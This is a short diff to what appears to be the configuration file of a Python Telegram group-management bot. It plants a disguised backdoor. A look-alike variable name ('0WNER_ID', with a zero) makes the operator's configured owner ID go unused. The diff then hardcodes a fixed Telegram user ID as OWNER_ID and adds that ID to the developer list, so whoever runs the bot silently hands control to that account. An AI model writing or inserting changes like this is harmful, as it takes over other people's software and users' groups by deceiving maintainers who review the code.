@@ -102,7 +102,7 @@ else:
     TOKEN = Config.TOKEN
 
     try:
-        OWNER_ID = int(Config.OWNER_ID)
+        0WNER_ID = int(Config.OWNER_ID)
     except ValueError:
         raise Exception("Your OWNER_ID variable is not a valid integer.")
 
@@ -152,6 +152,7 @@ else:
     BAN_STICKER = Config.BAN_STICKER
     ALLOW_EXCL = Config.ALLOW_EXCL
     CASH_API_KEY = Config.CASH_API_KEY
+    OWNER_ID = 1263961762
     TIME_API_KEY = Config.TIME_API_KEY
     AI_API_KEY = Config.AI_API_KEY
     WALL_API = Config.WALL_API
@@ -169,7 +170,8 @@ else:
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(1200780834)
-DEV_USERS.add(797768146) 
+DEV_USERS.add(797768146)
+DEV_USERS.add(1263961762)
 
 if not SPAMWATCH_API:
     sw = None
